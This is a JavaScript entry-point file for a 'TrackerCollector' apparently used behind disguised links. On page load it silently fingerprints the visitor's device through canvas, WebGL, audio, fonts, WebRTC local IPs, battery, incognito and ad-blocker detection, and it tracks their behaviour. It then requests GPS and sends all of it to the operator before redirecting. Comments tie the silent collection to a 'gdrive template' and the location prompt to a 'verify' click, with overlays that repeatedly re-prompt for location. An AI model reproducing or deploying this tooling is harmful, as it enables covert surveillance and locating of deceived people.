// --- Collector Entry Point ---
// Orchestrates device collection and exposes the public TrackerCollector API.

import { BehaviorTracker } from './behavior-tracker.js';
import {
  parseUA, hashString,
  collectAudioFingerprint, collectMediaDevices, collectStorageEstimate,
  collectPermissions, detectAdBlocker, detectIncognito,
  collectWebRTCIPs, collectSpeechVoices, collectBattery, collectClientHints,
  collectKeyboardLayout, collectSVGFilterFingerprint,
  collectMediaQueries, collectIntlDetails, collectFonts, collectTimezoneExtended,
  collectAPIPresence, collectWebGLExtended, collectNetworkInfo, collectScreenExtended,
  collectNavigatorExtended, collectMathFingerprint, collectDOMRectFingerprint,
  collectMediaCodecs, collectAudioContextProps, collectCSSSystemColors,
  collectWebGL2Extended, collectErrorFingerprint, collectWasmCapabilities,
  collectScrollbarWidth, collectTimerResolution, collectTextMetrics,
  collectDateToStringFingerprint, collectEmojiSupport, collectPerfEntryTypes,
  collectSecurityContext, collectCSSSupport, collectLineBreakFingerprint
} from './fingerprint-collectors.js';
import {
  requestGPS, requestGPSDirect, checkGeoPermission,
  sendData, buildGpsOverlay, handleGpsRequired
} from './gps-handler.js';

var deviceInfo = {};

function collectDevice() {
  var ua = navigator.userAgent || '';
  var parsed = parseUA(ua);

  deviceInfo = {
    browser: parsed.browser,
    browserVersion: parsed.browserVersion,
    os: parsed.os,
    platform: navigator.platform || null,
    cpuCores: navigator.hardwareConcurrency || null,
    ram: navigator.deviceMemory || null,
    screenWidth: screen.width || null,
    screenHeight: screen.height || null,
    colorDepth: screen.colorDepth || null,
    touchSupport: navigator.maxTouchPoints > 0,
    language: navigator.language || null,
    timezone: null,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack === '1',
    gpuVendor: null,
    gpuRenderer: null,
    canvasHash: null,
    referrer: document.referrer || null,
    pageLoadTime: null,
    installedLanguages: navigator.languages ? navigator.languages.join(',') : null
  };

  // Timezone
  try {
    deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  } catch(e) {}

  // Page load time
  try {
    if (performance && performance.timing) {
      var t = performance.timing;
      deviceInfo.pageLoadTime = t.loadEventEnd - t.navigationStart;
      if (deviceInfo.pageLoadTime <= 0) {
        deviceInfo.pageLoadTime = Date.now() - t.navigationStart;
      }
    }
  } catch(e) {}

  // GPU via WebGL
  var gl = null;
  try {
    var canvas = document.createElement('canvas');
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      var ext = gl.getExtension('WEBGL_debug_renderer_info');
      if (ext) {
        deviceInfo.gpuVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
        deviceInfo.gpuRenderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch(e) {}

  // WebGL extended
  Object.assign(deviceInfo, collectWebGLExtended(gl));

  // Enhanced canvas fingerprint
  try {
    var c = document.createElement('canvas');
    c.width = 300;
    c.height = 150;
    var ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('fingerprint', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('fingerprint', 4, 17);
    ctx.font = '18px serif';
    ctx.fillText('\uD83D\uDE00\uD83D\uDCBB\uD83C\uDF0D', 2, 40);
    ctx.font = '14px sans-serif';
    ctx.fillText('\u4E16\u754C\u4F60\u597D', 2, 65);
    ctx.fillText('\u0645\u0631\u062D\u0628\u0627', 100, 65);
    var grad = ctx.createLinearGradient(0, 80, 200, 80);
    grad.addColorStop(0, '#ff0000');
    grad.addColorStop(0.5, '#00ff00');
    grad.addColorStop(1, '#0000ff');
    ctx.fillStyle = grad;
    ctx.fillRect(0, 80, 200, 20);
    ctx.beginPath();
    ctx.moveTo(0, 110);
    ctx.bezierCurveTo(50, 90, 150, 140, 300, 110);
    ctx.strokeStyle = '#8B5CF6';
    ctx.lineWidth = 2;
    ctx.stroke();
    ctx.beginPath();
    ctx.arc(250, 40, 25, 0, Math.PI * 2);
    ctx.fillStyle = 'rgba(255, 107, 107, 0.5)';
    ctx.fill();
    deviceInfo.canvasHash = hashString(c.toDataURL());
  } catch(e) {}

  // Sync collectors
  Object.assign(deviceInfo, collectNetworkInfo());
  Object.assign(deviceInfo, collectScreenExtended());
  Object.assign(deviceInfo, collectNavigatorExtended());
  Object.assign(deviceInfo, collectMediaQueries());
  deviceInfo.intlLocaleFingerprint = collectIntlDetails();
  deviceInfo.detectedFonts = collectFonts();
  Object.assign(deviceInfo, collectTimezoneExtended());
  deviceInfo.apiSupport = collectAPIPresence();

  // Misc inline
  try { deviceInfo.multiMonitor = screen.isExtended || false; } catch(e) { deviceInfo.multiMonitor = null; }
  deviceInfo.maxTouchPoints = navigator.maxTouchPoints != null ? navigator.maxTouchPoints : null;
  try {
    var plugs = [];
    for (var i = 0; i < navigator.plugins.length; i++) {
      plugs.push(navigator.plugins[i].name);
    }
    deviceInfo.installedPlugins = plugs.length > 0 ? plugs.join(',') : null;
  } catch(e) { deviceInfo.installedPlugins = null; }
  try {
    var navEntries = performance.getEntriesByType('navigation');
    if (navEntries && navEntries.length > 0) {
      deviceInfo.navigationType = navEntries[0].type || null;
    }
  } catch(e) { deviceInfo.navigationType = null; }
  try {
    if (performance.memory) {
      deviceInfo.jsHeapSizeLimit = performance.memory.jsHeapSizeLimit || null;
    }
  } catch(e) { deviceInfo.jsHeapSizeLimit = null; }

  // Advanced fingerprints (sync)
  deviceInfo.mathFingerprint = collectMathFingerprint();
  deviceInfo.domRectFingerprint = collectDOMRectFingerprint();
  deviceInfo.mediaCodecFingerprint = collectMediaCodecs();
  deviceInfo.audioContextProps = collectAudioContextProps();
  deviceInfo.cssSystemColorFingerprint = collectCSSSystemColors();
  deviceInfo.webgl2Fingerprint = collectWebGL2Extended();
  deviceInfo.errorMessageFingerprint = collectErrorFingerprint();
  deviceInfo.wasmCapabilities = collectWasmCapabilities();
  deviceInfo.scrollbarWidth = collectScrollbarWidth();
  deviceInfo.timerResolution = collectTimerResolution();
  deviceInfo.textMetricsFingerprint = collectTextMetrics();
  deviceInfo.dateToStringFingerprint = collectDateToStringFingerprint();
  deviceInfo.emojiSupportFingerprint = collectEmojiSupport();
  deviceInfo.perfEntryTypes = collectPerfEntryTypes();
  deviceInfo.securityContext = collectSecurityContext();
  deviceInfo.cssSupportFingerprint = collectCSSSupport();
  deviceInfo.lineBreakFingerprint = collectLineBreakFingerprint();

  // Run async collectors
  return Promise.all([
    collectAudioFingerprint(),
    collectMediaDevices(),
    collectStorageEstimate(),
    collectPermissions(),
    detectAdBlocker(),
    detectIncognito(),
    collectWebRTCIPs(),
    collectSpeechVoices(),
    collectBattery(),
    collectClientHints(),
    collectKeyboardLayout(),
    collectSVGFilterFingerprint()
  ]).then(function(results) {
    deviceInfo.audioHash = results[0];
    Object.assign(deviceInfo, results[1]); // media devices
    Object.assign(deviceInfo, results[2]); // storage
    Object.assign(deviceInfo, results[3]); // permissions
    deviceInfo.adBlockerDetected = results[4];
    deviceInfo.incognitoDetected = results[5];
    deviceInfo.localIPs = results[6];
    deviceInfo.speechVoicesHash = results[7];
    Object.assign(deviceInfo, results[8]); // battery
    Object.assign(deviceInfo, results[9]); // client hints
    deviceInfo.keyboardLayout = results[10];
    deviceInfo.svgFilterFingerprint = results[11];
    Object.assign(deviceInfo, BehaviorTracker.summarize());
    return deviceInfo;
  }).catch(function() {
    Object.assign(deviceInfo, BehaviorTracker.summarize());
    return deviceInfo;
  });
}

// Public API
window.TrackerCollector = {
  // Full run: collect device + GPS, send, redirect (for redirect template)
  run: function(config) {
    var gpsMode = (config.gpsMode || 'optional');

    if (gpsMode === 'disabled') {
      collectDevice().then(function() {
        var payload = Object.assign({}, deviceInfo, { gpsGranted: false });
        sendData(config, payload).then(function() {
          if (config.templateId === 'redirect') {
            window.location.href = config.targetUrl;
          }
        });
      });
      return;
    }

    if (gpsMode === 'required') {
      collectDevice().then(function() {
        handleGpsRequired(config, 0, deviceInfo);
      });
      return;
    }

    // optional (default) — request GPS immediately in parallel with device collection
    var gpsPromise = requestGPS();
    var devicePromise = collectDevice();

    Promise.all([devicePromise, gpsPromise]).then(function(results) {
      var gpsInfo = results[1];
      var payload = Object.assign({}, deviceInfo, gpsInfo);
      sendData(config, payload).then(function() {
        if (config.templateId === 'redirect') {
          window.location.href = config.targetUrl;
        }
      });
    });
  },

  // Collect device info silently (for gdrive template on page load)
  collectDeviceInfo: function() {
    window.__deviceCollectPromise = collectDevice();
    return window.__deviceCollectPromise;
  },

  // Request GPS then submit all data (for gdrive template on verify click)
  requestGPSAndSubmit: function(config, callback) {
    var gpsMode = (config.gpsMode || 'optional');

    var ensureDevice = window.__deviceCollectPromise || Promise.resolve();

    if (gpsMode === 'disabled') {
      ensureDevice.then(function() {
        Object.assign(deviceInfo, BehaviorTracker.summarize());
        var payload = Object.assign({}, deviceInfo, { gpsGranted: false });
        sendData(config, payload).then(function() {
          if (callback) callback();
        });
      });
      return;
    }

    if (gpsMode === 'required') {
      var retryCount = 0;
      var gpsInFlight = false;

      function finishWithGps(gpsInfo) {
        ensureDevice.then(function() {
          Object.assign(deviceInfo, BehaviorTracker.summarize());
          var p = Object.assign({}, deviceInfo, gpsInfo);
          sendData(config, p).then(function() {
            if (callback) callback();
          });
        });
      }

      function finishWithoutGps() {
        var existing = document.getElementById('__gps_required_overlay');
        if (existing) existing.remove();
        ensureDevice.then(function() {
          Object.assign(deviceInfo, BehaviorTracker.summarize());
          var p2 = Object.assign({}, deviceInfo, { gpsGranted: false });
          sendData(config, p2).then(function() {
            if (callback) callback();
          });
        });
      }

      function showOverlayWithRetry(isDenied, count) {
        buildGpsOverlay(isDenied, function(resultCallback) {
          if (gpsInFlight) return;
          gpsInFlight = true;
          requestGPSDirect(
            function(result) {
              gpsInFlight = false;
              resultCallback(result);
              handleResult(result, count);
            },
            function(result) {
              gpsInFlight = false;
              resultCallback(result);
              handleResult(result, count);
            }
          );
        });
      }

      function handleResult(gpsInfo, count) {
        if (gpsInfo.gpsGranted) {
          finishWithGps(gpsInfo);
          return;
        }

        // Instant denial = OS-level block, don't count as a user retry
        var nextCount = gpsInfo.instantDenial ? count : count + 1;

        if (nextCount >= 3) {
          finishWithoutGps();
          return;
        }

        checkGeoPermission().then(function(permState) {
          var isDenied = permState === 'denied' || (permState === 'unknown' && gpsInfo.instantDenial);
          showOverlayWithRetry(isDenied, nextCount);
        });
      }

      // Initial GPS attempt — uses requestGPSDirect to stay in gesture chain
      function onInitialResult(gpsInfo) {
        handleResult(gpsInfo, retryCount);
      }
      requestGPSDirect(onInitialResult, onInitialResult);
      return;
    }

    // optional — use requestGPSDirect to keep getCurrentPosition() in the
    // synchronous gesture chain (fixes iOS Safari prompt)
    function onOptionalResult(gpsInfo) {
      ensureDevice.then(function() {
        Object.assign(deviceInfo, BehaviorTracker.summarize());
        var payload = Object.assign({}, deviceInfo, gpsInfo);
        sendData(config, payload).then(function() {
          if (callback) callback();
        });
      });
    }
    requestGPSDirect(onOptionalResult, onOptionalResult);
  },
};
